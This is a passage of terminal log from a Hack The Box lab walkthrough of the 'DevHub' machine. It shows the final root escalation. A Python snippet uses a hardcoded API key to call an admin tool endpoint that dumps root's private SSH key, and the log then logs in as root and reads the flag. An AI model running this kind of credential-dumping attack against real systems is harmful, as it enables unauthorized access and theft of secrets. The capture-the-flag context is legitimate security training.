root@10.129.3.147's password: 

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh-keygen -y -f /tmp/root_key
Load key "/tmp/root_key": error in libcrypto
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# rm -f /tmp/root_key
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# scp -i ~/.ssh/id_rsa analyst@10.129.3.147:/tmp/root_key /tmp/root_key
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# chmod 600 /tmp/root_key
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# scp -i ~/.ssh/id_rsa analyst@10.129.3.147:/tmp/root_key /tmp/root_key
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.3.147
Load key "/tmp/root_key": error in libcrypto
root@10.129.3.147's password: 

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.3.147
Load key "/tmp/root_key": error in libcrypto
root@10.129.3.147's password: 

                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# python3 - <<'EOF'
import json, urllib.request

url = "http://127.0.0.1:5000/tools/call"
headers = {
    "X-API-Key": "opsmcp_secret_key_4f5a6b7c8d9e0f1a",
    "Content-Type": "application/json"
}
payload = {
    "name": "ops._admin_dump",
    "arguments": {"target": "ssh_keys", "confirm": True}
}
req = urllib.request.Request(url, data=json.dumps(payload).encode(), headers=headers)
resp = json.load(urllib.request.urlopen(req))
key = resp["root_private_key"]
open("/tmp/root_key", "w").write(key)
print("[+] Key written:", len(key), "chars")
EOF
chmod 600 /tmp/root_key
[+] Key written: 1811 chars
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh-keygen -y -f /tmp/root_key

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBYfDgi/zIPDKo5pw7m4HY4Wv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+HbuITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQsgyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5sqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oaV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5p root@devhub
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@127.0.0.1
ssh: connect to host 127.0.0.1 port 22: Connection refused
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@127.0.0.1
ssh: connect to host 127.0.0.1 port 22: Connection refused
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# ssh -i /tmp/root_key -o StrictHostKeyChecking=no root@10.129.3.147
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Aug  2 07:37:56 PM UTC 2026

  System load:           0.0
  Usage of /:            79.5% of 9.50GB
  Memory usage:          25%
  Swap usage:            0%
  Processes:             242
  Users logged in:       2
  IPv4 address for eth0: 10.129.3.147
  IPv6 address for eth0: dead:beef::250:56ff:fe95:a339

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Aug 2 19:37:57 2026 from 10.10.14.60
root@devhub:~# ls 
root.txt  snap
root@devhub:~# cat root.txt
d3bc6272547b9ca3a8791263c38b9be4
root@devhub:~# ^C
root@devhub:~# exit
logout
Connection to 10.129.3.147 closed.
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/HTB-DevHub]
└─# 

```


![[Pasted image 20260804015439.png]]

![[Pasted image 20260804015602.png]]

